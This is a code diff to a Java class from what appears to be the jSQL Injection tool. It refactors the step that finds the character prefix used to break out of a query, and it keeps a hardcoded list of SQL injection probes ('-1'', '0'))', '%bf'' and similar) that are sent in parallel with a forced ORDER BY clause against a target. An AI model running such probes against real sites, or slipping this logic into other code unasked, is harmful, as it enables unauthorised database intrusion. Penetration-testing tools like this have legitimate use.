@@ -1,5 +1,6 @@
 package com.jsql.model.suspendable;
 
+import java.util.AbstractMap.SimpleEntry;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
@@ -8,19 +9,16 @@ import java.util.concurrent.ExecutionException;
 import java.util.concurrent.ExecutorCompletionService;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
-import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
 import org.apache.log4j.Logger;
 
+import com.jsql.model.InjectionModel;
 import com.jsql.model.MediatorModel;
-import com.jsql.model.exception.InjectionFailureException;
 import com.jsql.model.exception.JSqlException;
 import com.jsql.model.exception.StoppedByUserSlidingException;
-import com.jsql.model.injection.method.MethodInjection;
 import com.jsql.model.suspendable.callable.CallablePageSource;
 import com.jsql.model.suspendable.callable.ThreadFactoryCallable;
-import com.jsql.util.ConnectionUtil;
 
 /**
  * Runnable class, define insertionCharacter that will be used by all futures requests,
@@ -38,120 +36,13 @@ public class SuspendableGetCharInsertion extends AbstractSuspendable<String> {
     /**
      * 
      */
+    @SuppressWarnings("unchecked")
     @Override
     public String run(Object... args) throws JSqlException {
         
-        int nbStarInParameter = 0;
-        String characterInsertionByUser = "";
-        
-        if (ConnectionUtil.getQueryString().contains("*")) {
-            nbStarInParameter++;
-        }
-        if (ConnectionUtil.getRequest().contains("*")) {
-            nbStarInParameter++;
-        }
-        if (ConnectionUtil.getHeader().contains("*")) {
-            nbStarInParameter++;
-        }
-        
-        // Injection Point
-        if (nbStarInParameter >= 2) {
-            throw new InjectionFailureException("Character * must be used once in Query String, Request or Header parameters");
-            
-        } else if (
-            ConnectionUtil.getQueryString().contains("*")
-            && ConnectionUtil.getMethodInjection() != MethodInjection.QUERY
-        ) {
-            throw new InjectionFailureException("Select method GET to use character * or remove it from GET parameters");
-            
-        } else if (
-            ConnectionUtil.getRequest().contains("*")
-            && ConnectionUtil.getMethodInjection() != MethodInjection.REQUEST
-        ) {
-            throw new InjectionFailureException("Select one of Request method to use character * or remove it from Request parameters");
-            
-        } else if (
-            ConnectionUtil.getHeader().contains("*")
-            && ConnectionUtil.getMethodInjection() != MethodInjection.HEADER
-        ) {
-            throw new InjectionFailureException("Select method Header to use character * or remove it from Header parameters");
-            
-        }
-        
-        // Query String
-        else if (
-            ConnectionUtil.getMethodInjection() == MethodInjection.QUERY
-            && (ConnectionUtil.getQueryString() == null || "".equals(ConnectionUtil.getQueryString()))
-            && !ConnectionUtil.getUrlBase().contains("*")
-        ) {
-            throw new InjectionFailureException("No query string");
-            
-        } else if (
-            !"".equals(ConnectionUtil.getQueryString())
-            && ConnectionUtil.getQueryString().matches("[^\\w]*=.*")
-        ) {
-            throw new InjectionFailureException("Incorrect Query String");
-            
-        }
-        
-        // Request/Header data
-        else if (
-            !"".equals(ConnectionUtil.getRequest())
-            && ConnectionUtil.getRequest().indexOf('=') < 0
-        ) {
-            throw new InjectionFailureException("Incorrect Request format");
-            
-        } else if (
-            !"".equals(ConnectionUtil.getHeader())
-            && ConnectionUtil.getHeader().indexOf(':') < 0
-        ) {
-            throw new InjectionFailureException("Incorrect Header format");
-            
-        // Parse query information: url=>everything before the sign '=',
-        // start of query string=>everything after '='
-        } else if (ConnectionUtil.getMethodInjection() == MethodInjection.QUERY) {
-            if (ConnectionUtil.getQueryString().contains("*") || ConnectionUtil.getUrlBase().contains("*")) {
-                return "";
-            } else if (!ConnectionUtil.getQueryString().matches(".*=$")) {
-                Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(ConnectionUtil.getQueryString());
-                regexSearch.find();
-                try {
-                    ConnectionUtil.setQueryString(regexSearch.group(1));
-                    characterInsertionByUser = regexSearch.group(2);
-                } catch (IllegalStateException e) {
-                    throw new InjectionFailureException("Incorrect Query String format", e);
-                }
-            }
-            
-        // Parse post information
-        } else if (ConnectionUtil.getMethodInjection() == MethodInjection.REQUEST) {
-            if (ConnectionUtil.getRequest().contains("*")) {
-                return "";
-            } else if (!ConnectionUtil.getRequest().matches(".*=$")) {
-                Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(ConnectionUtil.getRequest());
-                regexSearch.find();
-                try {
-                    ConnectionUtil.setRequest(regexSearch.group(1));
-                    characterInsertionByUser = regexSearch.group(2);
-                } catch (IllegalStateException e) {
-                    throw new InjectionFailureException("Incorrect Request format", e);
-                }
-            }
-        // Parse header information
-        } else if (ConnectionUtil.getMethodInjection() == MethodInjection.HEADER) {
-            if (ConnectionUtil.getHeader().contains("*")) {
-                return "";
-            } else if (!ConnectionUtil.getHeader().matches(".*:$")) {
-                Matcher regexSearch = Pattern.compile("(.*:)(.*)").matcher(ConnectionUtil.getHeader());
-                regexSearch.find();
-                try {
-                    ConnectionUtil.setHeader(regexSearch.group(1));
-                    characterInsertionByUser = regexSearch.group(2);
-                } catch (IllegalStateException e) {
-                    throw new InjectionFailureException("Incorrect Header format", e);
-                }
-            }
-        }
+        String characterInsertionByUser = (String) args[0];
+        SimpleEntry<String, String> parameterToInject = (SimpleEntry<String, String>) args[1];
+        boolean isJson = (boolean) args[2];
 
         // Parallelize the search and let the user stops the process if needed.
         // SQL: force a wrong ORDER BY clause with an inexistent column, order by 1337,
@@ -161,6 +52,7 @@ public class SuspendableGetCharInsertion extends AbstractSuspendable<String> {
         ExecutorService taskExecutor = Executors.newCachedThreadPool(new ThreadFactoryCallable("CallableGetInsertionCharacter"));
         CompletionService<CallablePageSource> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
 
+        // TODO Generate
         List<String> charactersInsertion = new ArrayList<>(Arrays.asList(new String[]{
             "-1", "-1'", "'-1'", "-1)", "-1))", "-1\"", "\"-1\"", "-1')", "'-1')", "-1'))", "'-1'))", "-1\")", "\"-1\")", "-1\"))", "\"-1\"))",
             "0", "0'", "'0'", "0)", "0))", "0\"", "\"0\"", "0')", "'0')", "0'))", "'0'))", "0\")", "\"0\")", "0\"))", "\"0\"))",
@@ -170,15 +62,13 @@ public class SuspendableGetCharInsertion extends AbstractSuspendable<String> {
             "'", "\"",
             "%bf'", "%bf\""
         }));
-        if (!"".equals(characterInsertionByUser)) {
-            charactersInsertion.add(0, characterInsertionByUser);
-        }
         
         for (String insertionCharacter: charactersInsertion) {
             taskCompletionService.submit(
                 new CallablePageSource(
-                    insertionCharacter +
-                    MediatorModel.model().getVendor().instance().sqlOrderBy(),
+                    insertionCharacter
+                    + " "
+                    + MediatorModel.model().getVendor().instance().sqlOrderBy(),
                     insertionCharacter
                 )
             );
@@ -221,11 +111,18 @@ public class SuspendableGetCharInsertion extends AbstractSuspendable<String> {
             } else {
                 characterInsertion = characterInsertionByUser;
             }
-            LOGGER.trace("No character insertion activates ORDER BY, forcing to ["+ characterInsertion +"]");
+            LOGGER.trace("No character insertion activates ORDER BY error, forcing to ["+ characterInsertion.replace(InjectionModel.STAR, "") +"]");
         } else if (!characterInsertionByUser.equals(characterInsertion)) {
-            LOGGER.trace("Character insertion ["+ characterInsertion +"] used in place of ["+ characterInsertionByUser +"] to detect error on ORDER BY");
-            LOGGER.trace("Add manually the character * like ["+ characterInsertionByUser +"*] to force the value ["+ characterInsertionByUser +"]");
+            String characterInsertionByUserFormat = characterInsertionByUser.replace(InjectionModel.STAR, "");
+            LOGGER.trace("Character insertion ["+ characterInsertion +"] used in place of ["+ characterInsertionByUserFormat +"] to detect error on ORDER BY");
+            LOGGER.trace("Add manually the character * like ["+ characterInsertionByUserFormat +"*] to force the value ["+ characterInsertionByUserFormat +"]");
         }
+        
+        if (!isJson) {
+            characterInsertion = characterInsertion.replace(InjectionModel.STAR, "") + InjectionModel.STAR;
+        }
+        
+        parameterToInject.setValue(characterInsertion);
 
         // TODO optional
         return characterInsertion;
